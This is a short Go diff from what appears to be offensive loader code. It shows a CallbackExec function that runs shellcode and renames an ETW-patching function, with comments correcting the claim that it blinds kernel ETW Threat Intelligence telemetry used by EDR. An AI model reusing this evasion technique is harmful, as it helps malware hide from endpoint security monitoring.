@@ -288,11 +288,14 @@ func CallbackExec(shellcode []byte) error {
 	return nil
 }
 
-// PatchETWThreatIntel patches the ETW Threat Intelligence provider
-// (Microsoft-Windows-Threat-Intelligence) that kernel ETW sensors use.
-// This is separate from userland EtwEventWrite — it blinds kernel-level
-// telemetry that feeds EDR drivers.
-func PatchETWThreatIntel() error {
+// PatchETWWriteEx patches EtwEventWriteEx in ntdll. This is a userland
+// ETW write function used by some providers as an alternative to
+// EtwEventWrite. Patching both provides broader userland ETW coverage.
+//
+// NOTE: This does NOT patch the kernel-mode ETW Threat Intelligence
+// provider (EtwTi* in ntoskrnl). Kernel ETW-TI cannot be disabled
+// from userland without a signed driver.
+func PatchETWWriteEx() error {
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	etwTiProc := ntdll.NewProc("EtwEventWriteEx")
 
